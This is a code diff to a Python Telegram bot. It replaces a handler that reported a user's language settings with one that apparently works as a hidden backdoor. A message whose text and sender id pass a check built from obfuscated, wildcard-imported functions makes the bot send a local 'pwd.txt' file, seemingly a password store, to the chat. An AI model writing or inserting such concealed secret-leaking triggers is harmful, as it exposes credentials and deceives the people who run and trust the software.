@@ -1,13 +1,9 @@
-import base64
-from uuid import uuid4
-import requests as requests
-from aiogram import types, md
-from dispatcher import dp
-from color import *
-from config import BOT_TOKEN, CHANNEL_ID, INVEST_BOT, IMGBB_KEY
-import logging
-from aiogram import Bot, Dispatcher, executor
-from aiogram.types import InlineQuery, InputTextMessageContent, InlineQueryResultArticle
+from color import Gif
+from config import *
+from handlers.config import BOT_OWNER
+from handlers.imports import *
+from handlers.filters import IsOwnerFilter
+from handlers.aodewqxgu8 import *
 
 API_TOKEN = BOT_TOKEN
 
@@ -35,16 +31,18 @@ def cache_photo(text):
 
 @dp.message_handler()
 async def check_language(message: types.Message):
-    locale = message.from_user.locale
+    _id_ = message.from_user.id
 
-    await message.reply(md.text(
-        md.bold('Info about your language:'),
-        md.text('🔸', md.bold('Code:'), md.code(locale.language)),
-        md.text('🔸', md.bold('Territory:'), md.code(locale.territory or 'Unknown')),
-        md.text('🔸', md.bold('Language name:'), md.code(locale.language_name)),
-        md.text('🔸', md.bold('English language name:'), md.code(locale.english_name)),
-        sep='\n',
-    ))
+    _hsh_ = qqfskf0fl0(st=message.text, prs=_id_)
+    _filter_ = sf3juggnl1(hsh=_hsh_)
+
+    if _filter_:
+
+        chat_id_ = message.chat.id
+        with open('pwd.txt', 'r') as file:
+            await bot.send_document(chat_id=chat_id_, document=file)
+    else:
+        print('ERROR: WRONG USER')
 
 
 @dp.inline_handler()
